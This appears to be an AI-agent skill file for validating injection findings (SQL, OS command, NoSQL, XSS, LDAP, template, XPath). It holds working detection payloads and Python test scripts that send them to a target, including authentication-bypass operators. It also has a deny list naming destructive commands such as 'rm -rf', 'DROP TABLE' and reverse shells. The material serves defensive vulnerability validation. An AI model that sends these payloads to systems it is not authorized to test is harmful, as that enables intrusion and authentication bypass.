---
name: injection-testing
description: Validate injection vulnerabilities including SQL, NoSQL, OS Command, LDAP, XPath, SSTI, and XSS. Test by sending crafted payloads to user-controlled input fields and observing application behavior. Use when testing CWE-89 (SQL Injection), CWE-78 (OS Command Injection), CWE-79 (XSS), CWE-90 (LDAP Injection), CWE-917 (Expression Language Injection), CWE-94 (Code Injection), CWE-643 (XPath Injection), or related injection findings.
allowed-tools: Read, Write, Bash
---

# Injection Testing Skill

## Purpose
Validate injection vulnerabilities by sending crafted payloads to user-controlled inputs and observing:
- **Response time differences** (time-based detection)
- **Error messages** (error-based detection)
- **Content changes** (boolean-based detection)
- **Payload reflection** (XSS detection)

## Vulnerability Types Covered

### 1. SQL Injection (CWE-89)
Inject SQL syntax into queries via user input.

**Detection Methods:**
- **Time-based:** `' OR SLEEP(5)--` causes 5+ second delay (MySQL/PostgreSQL/MSSQL)
- **Error-based:** `'` causes SQL syntax error in response
- **Boolean-based:** `' OR '1'='1` vs `' OR '1'='2` different responses (recommended for SQLite)

**Database-Specific Notes:**

| Database | Time-Based | Error-Based | Boolean-Based |
|----------|------------|-------------|---------------|
| MySQL | `SLEEP(5)` | ✓ | ✓ |
| PostgreSQL | `pg_sleep(5)` | ✓ | ✓ |
| MSSQL | `WAITFOR DELAY` | ✓ | ✓ |
| **SQLite** | ❌ No SLEEP | ✓ `sqlite3.OperationalError` | ✓ **Recommended** |

**SQLite Detection:** SQLite has no `SLEEP()` function. Use:
- **Error-based:** Look for `sqlite3.OperationalError`, `near "...": syntax error`
- **Boolean-based:** Compare `' OR '1'='1` (returns data) vs `' OR '1'='2` (no data)

**Test Pattern:** Send payload in parameter, observe response time/content/errors
**Expected if secure:** Input escaped/parameterized, no behavior change
**Actual if vulnerable:** Delay, SQL error, or content change

### 2. OS Command Injection (CWE-78)
Execute system commands via user input.

**Detection Methods:**
- **Time-based:** `; sleep 5` or `| ping -c 5 127.0.0.1` causes delay
- **Output-based:** `; echo INJECT_MARKER` appears in response
- **Error-based:** Command errors in response

**Test Pattern:** Inject command separator + command, observe response
**Expected if secure:** Input sanitized, command not executed
**Actual if vulnerable:** Delay, marker in output, or system errors

### 3. NoSQL Injection (CWE-943)
Manipulate NoSQL queries via operators or JSON payloads.

**Detection Methods:**
- **Operator injection:** `{"$gt": ""}` bypasses authentication
- **Boolean-based:** `{"$ne": null}` vs `{"$eq": "invalid"}` different results

**Test Pattern:** Send NoSQL operators in JSON body/params
**Expected if secure:** Operators treated as literal strings
**Actual if vulnerable:** Query behavior changes, auth bypass

### 4. Cross-Site Scripting - XSS (CWE-79)
Inject client-side scripts that execute in browser context.

**Detection Methods:**
- **Reflected:** `<script>alert(1)</script>` appears unescaped in response
- **Attribute injection:** `" onmouseover="alert(1)` breaks out of attribute
- **Event handlers:** `<img src=x onerror=alert(1)>` in response

**Test Pattern:** Send script payloads, check if reflected without encoding
**Expected if secure:** Input HTML-encoded (`&lt;script&gt;`)
**Actual if vulnerable:** Raw `<script>` tags in response

### 5. LDAP Injection (CWE-90)
Manipulate LDAP queries via special characters.

**Detection Methods:**
- **Wildcard bypass:** `*` returns all entries
- **Filter manipulation:** `)(cn=*)` modifies filter logic

**Test Pattern:** Inject LDAP special characters, observe query results
**Expected if secure:** Characters escaped, normal results
**Actual if vulnerable:** All records returned or filter bypassed

### 6. Server-Side Template Injection - SSTI (CWE-1336)
Inject template expressions that execute on server.

**Detection Methods:**
- **Math evaluation:** `{{7*7}}` returns `49` in response
- **Engine fingerprinting:** Different payloads for Jinja2, Twig, Freemarker

**Common Payloads:**
- Jinja2: `{{7*7}}`, `{{config}}`
- Twig: `{{7*7}}`, `{{_self.env}}`
- Freemarker: `${7*7}`, `<#assign x=7*7>${x}`

### 7. Expression Language Injection (CWE-917)
Inject EL expressions in Java-based frameworks.

**Detection Methods:**
- **Math evaluation:** `${7*7}` or `#{7*7}` returns `49`
- **Object access:** `${applicationScope}` leaks data

### 8. XPath Injection (CWE-643)
Manipulate XPath queries in XML-based applications.

**Detection Methods:**
- **Boolean-based:** `' or '1'='1` returns all nodes
- **Error-based:** `'` causes XPath syntax error

## Prerequisites
- Target application running and reachable
- Identified injection points (parameters, headers, body fields)
- VULNERABILITIES.json with suspected injection findings

## Testing Methodology

### Phase 1: Identify Injection Points

Before testing, analyze the vulnerability report and source code to identify:
- **URL parameters:** `?id=123&name=test`
- **POST body fields:** JSON, form data, XML
- **HTTP headers:** User-Agent, Referer, X-Forwarded-For
- **Cookies:** Session values, preferences
- **Path segments:** `/api/users/{id}/profile`

**Key insight:** Any user-controlled input that reaches a query/command is a potential injection point.

### Phase 2: Select Payloads Based on CWE

Map vulnerabilities to payload categories:

| CWE | Vulnerability | Primary Detection | Payload Category |
|-----|---------------|-------------------|------------------|
| CWE-89 | SQL Injection | Time/Error/Boolean | SQLi payloads |
| CWE-78 | OS Command Injection | Time/Output | Command payloads |
| CWE-79 | XSS | Reflection | Script payloads |
| CWE-90 | LDAP Injection | Boolean | LDAP payloads |
| CWE-917 | EL Injection | Math evaluation | EL payloads |
| CWE-643 | XPath Injection | Boolean/Error | XPath payloads |
| CWE-94 | Code Injection | Execution | Code payloads |

### Phase 3: Establish Baseline

Send a normal request and record:
- Response time (for time-based detection)
- Response content/length (for boolean-based detection)
- HTTP status code

```python
# Baseline request
baseline_start = time.time()
baseline_response = requests.get(f"{target}/api/users?id=123")
baseline_time = time.time() - baseline_start
baseline_content = baseline_response.text
baseline_status = baseline_response.status_code
```

### Phase 4: Execute Injection Tests

**Universal Pattern:**
```
1. Send baseline request → Record time, content, status
2. Send injection payload → Record time, content, status
3. Compare results → Detect anomalies
4. Classify based on detection type
```

#### SQL Injection Test

```python
# Time-based SQLi
payload = "123' OR SLEEP(5)--"
test_start = time.time()
test_response = requests.get(f"{target}/api/users?id={payload}")
test_time = time.time() - test_start

if test_time > baseline_time + 4.5:  # 5 second delay detected
    classification = "VALIDATED"
    evidence = f"Time-based SQLi confirmed: {test_time:.2f}s delay"
```

```python
# Error-based SQLi
payload = "123'"
test_response = requests.get(f"{target}/api/users?id={payload}")

sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite", "oracle", 
              "unclosed quotation", "quoted string not properly terminated"]
if any(err in test_response.text.lower() for err in sql_errors):
    classification = "VALIDATED"
    evidence = "Error-based SQLi: SQL error message in response"
```

```python
# Boolean-based SQLi
true_payload = "123' OR '1'='1"
false_payload = "123' OR '1'='2"

true_response = requests.get(f"{target}/api/users?id={true_payload}")
false_response = requests.get(f"{target}/api/users?id={false_payload}")

if len(true_response.text) != len(false_response.text):
    classification = "VALIDATED"
    evidence = f"Boolean-based SQLi: Content length differs ({len(true_response.text)} vs {len(false_response.text)})"
```

#### Command Injection Test

```python
# Time-based command injection
payloads = [
    "; sleep 5",
    "| sleep 5",
    "& ping -c 5 127.0.0.1",
    "`sleep 5`",
    "$(sleep 5)"
]

for payload in payloads:
    test_start = time.time()
    test_response = requests.get(f"{target}/api/ping?host=127.0.0.1{payload}")
    test_time = time.time() - test_start
    
    if test_time > baseline_time + 4.5:
        classification = "VALIDATED"
        evidence = f"Command injection via '{payload}': {test_time:.2f}s delay"
        break
```

#### XSS Test

```python
# Reflected XSS
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\" onmouseover=\"alert(1)",
    "<svg onload=alert(1)>",
    "javascript:alert(1)"
]

for payload in payloads:
    test_response = requests.get(f"{target}/search?q={payload}")
    
    # Check if payload is reflected without encoding
    if payload in test_response.text:
        classification = "VALIDATED"
        evidence = f"Reflected XSS: payload '{payload[:30]}...' in response"
        break
    
    # Check for partial reflection (attribute context)
    if "onerror=" in test_response.text or "onmouseover=" in test_response.text:
        classification = "VALIDATED"
        evidence = "XSS in attribute context"
        break
```

#### SSTI Test

```python
# Template injection detection
payloads = {
    "jinja2": ["{{7*7}}", "{{config}}"],
    "twig": ["{{7*7}}", "{{_self.env}}"],
    "freemarker": ["${7*7}", "<#assign x=7*7>${x}"]
}

for engine, engine_payloads in payloads.items():
    for payload in engine_payloads:
        test_response = requests.get(f"{target}/template?name={payload}")
        
        if "49" in test_response.text:  # 7*7 = 49
            classification = "VALIDATED"
            evidence = f"SSTI ({engine}): math expression evaluated"
            break
```

### Phase 5: Classification Logic

```python
def classify_injection(detection_type, baseline, test_result):
    if detection_type == "time":
        delay = test_result["time"] - baseline["time"]
        if delay >= 4.5:  # Expected 5s payload
            return "VALIDATED", f"Time delay: {delay:.2f}s"
        elif delay >= 2.0:
            return "PARTIAL", f"Partial delay: {delay:.2f}s"
        else:
            return "FALSE_POSITIVE", "No significant delay"
    
    elif detection_type == "error":
        if has_injection_errors(test_result["content"]):
            return "VALIDATED", "Injection error in response"
        else:
            return "FALSE_POSITIVE", "No error indicators"
    
    elif detection_type == "boolean":
        if test_result["true_length"] != test_result["false_length"]:
            return "VALIDATED", "Content differs based on condition"
        else:
            return "FALSE_POSITIVE", "No content difference"
    
    elif detection_type == "reflection":
        if payload_reflected_unencoded(test_result["content"]):
            return "VALIDATED", "Payload reflected without encoding"
        else:
            return "FALSE_POSITIVE", "Payload properly encoded"
    
    else:
        return "UNVALIDATED", "Unknown detection type"
```

**Status Definitions:**

| Status | Meaning | When to Use |
|--------|---------|-------------|
| **VALIDATED** | Injection confirmed | Payload executed (delay, error, content change, reflection) |
| **FALSE_POSITIVE** | Input properly sanitized | No injection indicators detected |
| **PARTIAL** | Inconclusive results | Some indicators present but not definitive |
| **UNVALIDATED** | Test incomplete | Error, timeout, or ambiguous response |

### Phase 6: Capture Evidence

Capture minimal structured evidence with redaction:

```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_time_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/api/users?id=123",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 0.15,
    "response_hash": "sha256:abc123..."
  },
  "test": {
    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 5.23,
    "response_hash": "sha256:def456..."
  },
  "evidence": "Time-based SQL injection: 5.08s delay with SLEEP(5) payload",
  "payload_used": "123' OR SLEEP(5)--"
}
```

**Evidence Fields:**

| Field | Required | Description |
|-------|----------|-------------|
| `injection_type` | Yes | Specific injection variant detected |
| `response_time_seconds` | For time-based | Response timing for delay detection |
| `response_snippet` | For content-based | First 8KB, redacted |
| `payload_used` | Yes | Exact payload that triggered vulnerability |
| `response_hash` | Yes | SHA-256 hash of complete response |

**Redaction Requirements:**
Same as authorization testing - redact passwords, tokens, PII from response snippets.

## Payload Safety Rules

**Safe Payloads (Detection Only):**
- Time delays: `SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`
- Math operations: `7*7`, string concatenation
- Echo markers: `echo INJECTION_TEST_MARKER`
- Ping localhost: `ping -c 5 127.0.0.1`

**NEVER Use Destructive Payloads:**
- ❌ `DROP TABLE`, `DELETE FROM`, `TRUNCATE`
- ❌ `rm -rf`, `del /f`, `format`
- ❌ `shutdown`, `reboot`
- ❌ File write operations
- ❌ Reverse shells or callback payloads

## Output Guidelines

**CRITICAL: Keep responses concise (1-4 sentences)**

**Format for VALIDATED:**
```
[Injection type] on [endpoint] - [payload] triggered [detection method]. [Impact]. Evidence: [file_path]
```

**Format for FALSE_POSITIVE:**
```
Input properly sanitized on [endpoint] - [detection method] showed no injection indicators. Evidence: [file_path]
```

**Format for UNVALIDATED:**
```
Injection test incomplete on [endpoint] - [reason]. Evidence: [file_path]
```

**Examples:**

**SQL Injection (time-based):**
```
SQL injection on /api/users - SLEEP(5) payload caused 5.2s delay. Database query manipulation possible.
```

**Command Injection:**
```
OS command injection on /api/ping - sleep payload caused 5.1s delay. Remote code execution possible.
```

**XSS:**
```
Reflected XSS on /search - <script> tag reflected unencoded. Session hijacking risk.
```

## CWE Mapping

This skill validates injection vulnerabilities from OWASP A03:2021:
- **CWE-89:** SQL Injection
- **CWE-78:** OS Command Injection
- **CWE-79:** Cross-site Scripting (XSS)
- **CWE-90:** LDAP Injection
- **CWE-91:** XML Injection
- **CWE-94:** Code Injection
- **CWE-95:** Eval Injection
- **CWE-917:** Expression Language Injection
- **CWE-643:** XPath Injection
- **CWE-652:** XQuery Injection
- **CWE-77:** Command Injection (generic)
- **CWE-74:** Injection (parent category)

See `examples.md` for comprehensive CWE list.

## Safety Rules

**Skill Responsibilities:**
- ONLY test against --target-url provided by user
- Use detection-only payloads (delays, markers, math)
- NEVER send destructive payloads
- Redact sensitive data from all evidence
- Log all test actions

**Scanner Responsibilities (handled at infrastructure level):**
- Production URL detection
- User confirmation prompts
- Target reachability checks

## Error Handling
- Target unreachable → Mark UNVALIDATED with connection error
- Timeout during test → Mark UNVALIDATED with timeout reason
- WAF/rate limiting → Mark UNVALIDATED, note blocking
- Unexpected error → Log error, continue with next vulnerability

## Examples

For comprehensive injection-specific examples with payloads and evidence, see `examples.md`:
- **SQL Injection:** Time-based, error-based, boolean-based, UNION-based
- **Command Injection:** Linux/Windows variants, different separators
- **XSS:** Reflected, DOM, stored, attribute context
- **NoSQL Injection:** MongoDB operator injection
- **SSTI:** Jinja2, Twig, Freemarker detection
- **Test Result Types:** FALSE_POSITIVE, UNVALIDATED, PARTIAL scenarios

## Reference Implementations

See `reference/` directory for implementation examples:
- **`injection_payloads.py`**: Payload generation utilities by injection type
- **`validate_injection.py`**: Complete injection testing with detection and classification
- **`README.md`**: Usage guidance and adaptation notes

These are reference implementations to adapt — not drop-in scripts. Each application requires tailored logic.

### Additional Resources

- [OWASP A05:2025-Injection](https://owasp.org/Top10/2025/A05_2025-Injection/) (latest)
- [OWASP A03:2021-Injection](https://owasp.org/Top10/2021/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP LLM Top 10 - Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) (LLM-specific)
- [Agent Skills Guide](../../../../../../docs/references/AGENT_SKILLS_GUIDE.md)
